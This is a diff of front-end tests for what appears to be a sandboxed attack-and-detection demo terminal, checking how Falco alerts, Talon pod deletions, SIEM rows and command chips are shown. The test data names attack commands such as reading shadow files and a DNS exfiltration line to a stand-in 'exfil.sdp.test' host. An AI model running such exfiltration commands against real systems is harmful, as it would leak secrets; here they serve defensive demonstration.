@@ -276,11 +276,12 @@ describe("the session summary (review 2, item 1)", () => {
 });
 
 const foot = (root: HTMLElement, seq: number) => text(root.querySelector(`.term__cmd[data-seq="${seq}"] .term__cmdfoot`));
-const sideLayer = (root: HTMLElement, layer: string) => root.querySelector(`.term__map .deflayer[data-layer="${layer}"]`)?.getAttribute("data-state");
 
 describe("a command that exited without an exit code (review 2, item 2)", () => {
   it("cut off by the 5 s limit: finished, explained, its layer lit, the input free again", async () => {
-    const t = await harness();
+    // The lit layers go to "How it works" (ADR 0035 amendment, UX stage 1), not to a map beside the terminal.
+    let lit: Map<string, { outcome: string }> = new Map();
+    const t = await harness({ hooks: { onLit: (l) => (lit = l) } });
     const f = new Feed().open();
     t.show(f);
     (t.root.querySelector(".term__chip") as HTMLButtonElement).click(); // `id`
@@ -291,7 +292,8 @@ describe("a command that exited without an exit code (review 2, item 2)", () => 
     f.cmd(1, "whoami", "exited", 8010); // no exit_code: the API's own timeout
     t.show(f);
     expect(foot(t.root, 1)).toContain("timed out: a command gets 5 seconds");
-    expect(sideLayer(t.root, "runtime")).toBe("allowed");
+    expect(lit.get("runtime")?.outcome).toBe("allowed");
+    expect(t.root.querySelector(".term__side .deflayer")).toBeNull();
     expect((t.root.querySelector(".term__send") as HTMLButtonElement).disabled).toBe(false);
   });
 
@@ -818,5 +820,129 @@ describe("long command lines (final review, item 7)", () => {
     const wbr = deface.querySelectorAll("wbr");
     expect(wbr.length).toBe(7); // 6 slashes, 1 semicolon
     for (const w of wbr) expect(w.previousSibling?.textContent).toMatch(/[/;]$/);
+  });
+});
+
+describe("what the output says about the run (UX stage 1)", () => {
+  it("an objective reached by the command that got the pod deleted is amber and says what it cost; one reached before stays green", async () => {
+    const t = await harness();
+    const f = new Feed().open();
+    f.ran(1, "read-flag", 3000, ["SDP{0123456789abcdef}"], 0, true);
+    killedBy(f, 2, 5000);
+    t.show(f.events);
+    const win = t.root.querySelector('.term__cmd[data-seq="1"] .term__line--win');
+    expect(text(win)).toBe("✓ objective reached: Steal credentials");
+    expect(t.root.querySelector('.term__cmd[data-seq="2"] .term__line--win')).toBeNull();
+    expect(text(t.root.querySelector('.term__cmd[data-seq="2"] .term__line--costly'))).toBe("✓ objective reached: Steal credentials — and it cost you the pod");
+  });
+
+  it("the 'Pod starting' banner turns into a ready line at pod_ready", async () => {
+    const t = await harness();
+    const f = new Feed();
+    f.run("queued", 0);
+    f.run("started", 40, "pod created");
+    t.show(f);
+    const banner = t.root.querySelector(".term__out .term__line--sys");
+    expect(text(banner)).toMatch(/^Pod starting\./);
+    f.run("pod_ready", 1900, "9b2e7c4d1a0f");
+    t.show(f);
+    expect(text(t.root.querySelector(".term__out .term__line--sys"))).toMatch(/^Pod ready\. You are uid 10001/);
+    expect(t.root.querySelector(".term__out")?.textContent).not.toContain("Pod starting");
+  });
+});
+
+describe("the session layout (UX stage 1)", () => {
+  it("beside the terminal only this run: detection, response and SIEM rows, objectives, its timeline, the shop; no seven-layer map", async () => {
+    const t = await harness();
+    const f = new Feed().open();
+    t.show(f);
+    const row = (k: string) => text(t.root.querySelector(`.thisrun__row[data-row="${k}"] dd`));
+    expect(row("detection")).toBe("Falco: nothing yet");
+    expect(row("response")).toBe("Talon: nothing to answer yet");
+    expect(row("siem")).toBe("nothing to correlate yet");
+    expect(t.root.querySelector(".term__side .deflayer")).toBeNull();
+    expect(t.root.querySelector(".term__side .term__shop")).not.toBeNull();
+    killedBy(f, 1, 5000);
+    t.show(f);
+    expect(row("detection")).toBe("Falco: Read sensitive file untrusted, 30 ms after your Enter");
+    expect(row("response")).toBe("Talon: deleted the pod, 120 ms after the alert");
+    expect(t.root.querySelector('.thisrun__row[data-row="response"]')?.getAttribute("data-tone")).toBe("respond");
+    const events = [...t.root.querySelectorAll(".thisrun__event")].map((e) => e.getAttribute("data-kind"));
+    expect(events).toEqual(["start", "ready", "command", "falco", "talon", "end"]);
+    expect(text(t.root.querySelector('.thisrun__event[data-kind="talon"]'))).toContain("Talon deleted the pod (+120 ms)");
+    t.term.setSiem({ text: "HIGH — Contained intrusion", tone: "siem", incidentId: "7e57000000000002" });
+    expect(t.root.querySelector(".thisrun__incident")?.getAttribute("href")).toBe("#incident-7e57000000000002");
+  });
+
+  it("the palette is full width under both, each chip coloured by what answers it, with a legend", async () => {
+    const t = await harness();
+    t.show(new Feed().open());
+    const palette = t.root.querySelector(".term__palette");
+    expect(palette?.parentElement?.classList.contains("terminal")).toBe(true);
+    expect(t.root.querySelector(".term__pane .term__chips")).toBeNull();
+    const chip = (id: string) => t.root.querySelector(`.term__chip[data-id="${id}"]`)?.className;
+    expect(chip("dns-exfil")).toContain("term__chip--siem");
+    expect(chip("read-shadow")).toContain("term__chip--detected");
+    expect(chip("touch-bin")).toContain("term__chip--prevented");
+    expect(chip("whoami")).toContain("term__chip--allowed");
+    expect([...(palette?.querySelectorAll(".term__legend li") ?? [])].map((li) => li.textContent)).toEqual(["allowed", "Falco answers", "prevented", "only the SIEM sees it"]);
+  });
+
+  it("carries the status strip under the input, tells the strip about the own session, and the bar is not a second announcer", async () => {
+    const strip = document.createElement("div");
+    strip.className = "run-strip";
+    const seen: (string | undefined)[] = [];
+    const t = await harness({ hooks: { strip, onSession: (s) => seen.push(s.run?.current) } });
+    t.show(new Feed().open());
+    expect(strip.parentElement?.classList.contains("term__pane")).toBe(true);
+    expect(seen.at(-1)).toBe("pod_ready");
+    expect(t.root.querySelector(".term__status")?.hasAttribute("aria-live")).toBe(false);
+  });
+
+  it("a picked command is highlighted and filled in once the pod is ready, and let go once it has run", async () => {
+    const t = await harness();
+    t.term.suggest("dns-exfil");
+    const f = new Feed();
+    f.run("queued", 0);
+    t.show(f);
+    expect((t.root.querySelector("#term-input") as HTMLInputElement).value).toBe("");
+    f.run("started", 40, "pod created");
+    f.run("pod_ready", 1900, "9b2e7c4d1a0f");
+    t.show(f);
+    expect(t.root.querySelector('.term__chip[data-id="dns-exfil"]')?.getAttribute("data-suggested")).toBe("true");
+    expect((t.root.querySelector("#term-input") as HTMLInputElement).value).toBe("nslookup sdp-<flag>.x.exfil.sdp.test.");
+    f.ran(1, "dns-exfil", 3000, ["query sdp-x"], 0, true);
+    t.show(f);
+    expect(t.root.querySelector(".term__chip[data-suggested]")).toBeNull();
+  });
+
+  it("from the start panel, a pick opens the session (one run)", async () => {
+    const t = await harness({ start: false });
+    t.term.suggest("dns-exfil");
+    await flush();
+    expect(t.calls.filter((c) => c.method === "POST" && c.path === "/api/attack/terminal")).toHaveLength(1);
+  });
+
+  it("'A run is in progress' says when that run must end at the latest", async () => {
+    let left: number | undefined = 192_000;
+    const t = await harness({ start: false, hooks: { blocked: () => "A run is in progress", blockedEndsIn: () => left } });
+    const eta = t.root.querySelector(".term-start__eta") as HTMLElement;
+    expect(eta.hidden).toBe(false);
+    expect(text(eta)).toBe("That run ends within 3:12 at the latest; the button unlocks then.");
+    left = undefined;
+    t.show(new Feed("1111222233334444", "network-tool-1111222233", "network-tool").open());
+    expect(eta.hidden).toBe(true);
+  });
+
+  it("'Run again' goes back to the start panel only once the session is over", async () => {
+    const t = await harness();
+    const f = new Feed().open();
+    t.show(f);
+    t.term.again();
+    expect(t.root.querySelector(".term-start")).toBeNull();
+    killedBy(f, 1, 5000);
+    t.show(f);
+    t.term.again();
+    expect(t.root.querySelector(".term-start")).not.toBeNull();
   });
 });
